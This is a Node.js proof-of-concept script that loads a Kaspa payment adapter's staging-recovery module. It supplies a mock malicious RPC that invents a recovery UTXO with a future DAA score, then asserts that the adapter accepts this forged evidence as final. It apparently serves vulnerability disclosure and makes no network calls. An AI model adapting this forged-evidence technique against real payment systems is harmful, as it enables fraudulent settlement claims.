#!/usr/bin/env node

import assert from "node:assert/strict";
import { access } from "node:fs/promises";
import { resolve } from "node:path";
import { pathToFileURL } from "node:url";

function usage() {
  console.error("usage: node poc.mjs --source-root ../../sompi");
  process.exit(2);
}

const args = process.argv.slice(2);
let sourceRoot;
if (args.length === 2 && args[0] === "--source-root") {
  sourceRoot = args[1];
} else if (args.length === 1 && !args[0].startsWith("-")) {
  sourceRoot = args[0];
} else {
  usage();
}

const root = resolve(sourceRoot);
const modulePath = resolve(
  root,
  "dist/adapters/kaspa-x402/staging-recovery-rpc.js"
);

try {
  await access(modulePath);
} catch {
  console.error("[-] compiled adapter not found; run `npm run build` in the source root");
  process.exit(2);
}

const { RpcStagingRecoveryRaceSource } = await import(pathToFileURL(modulePath).href);

const now = 1_000;
const tx = (byte) => byte.repeat(64);
const stagingOutpoint = `${tx("a")}:0`;
const expected = (byte, amount, script) => ({
  transactionId: tx(byte),
  transactionArtifactDigest: `sha256:${"A".repeat(43)}`,
  inputOutpoint: stagingOutpoint,
  outputOutpoint: `${tx(byte)}:0`,
  outputIndex: 0,
  outputAddress: `address-${byte}`,
  outputAmountAtomic: amount,
  outputScriptPublicKey: `0000${script}`,
});

const exactPayment = expected("b", "90", "bb");
const recovery = expected("c", "80", "cc");

// This object models a selected Byzantine Kaspa RPC. It does not contact a
// network. The recovery UTXO is invented, including its future block DAA score.
const rpc = {
  getServerInfo: async () => ({
    isSynced: true,
    hasUtxoIndex: true,
    networkId: "testnet-10",
    virtualDaaScore: 1_000n,
  }),
  getUtxosByAddresses: async () => ({
    entries: [{
      outpoint: { transactionId: recovery.transactionId, index: 0 },
      amount: 80n,
      scriptPublicKey: { version: 0, script: "cc" },
      blockDaaScore: 2_000n,
    }],
  }),
  getMempoolEntry: async () => {
    throw new Error("transaction not found");
  },
};

const source = new RpcStagingRecoveryRaceSource({
  rpc: { client: async () => rpc },
  now: () => now,
});

const evidence = await source.observeRace({
  network: "kaspa:testnet-10",
  staging: {
    outpoint: stagingOutpoint,
    address: "staging-address",
    amountAtomic: "100",
    scriptPublicKey: "0000aa",
    blockDaaScore: "1",
  },
  exactPayment,
  recovery,
  deadlineAtMs: now + 1_000,
  signal: new AbortController().signal,
});

assert.equal(evidence.exactPayment?.status, "absent");
assert.equal(evidence.recovery.status, "observed");
assert.equal(evidence.recovery.finality, "accepted");
assert.equal(evidence.staging.status, "spent");
assert.equal(evidence.staging.spendingTransactionId, recovery.transactionId);

console.log("[+] loaded target adapter from <source-root>/dist");
console.log("[+] RPC virtual DAA score: 1000");
console.log("[+] invented recovery block DAA score: 2000");
console.log(`[+] exact candidate status: ${evidence.exactPayment.status}`);
console.log(`[+] recovery candidate status: ${evidence.recovery.status}`);
console.log(`[+] recovery candidate finality: ${evidence.recovery.finality}`);
console.log(`[+] staging status: ${evidence.staging.status}`);
console.log(`[+] inferred spender: ${evidence.staging.spendingTransactionId}`);
console.log("[+] vulnerable behavior reproduced: one RPC forged accepted recovery evidence");
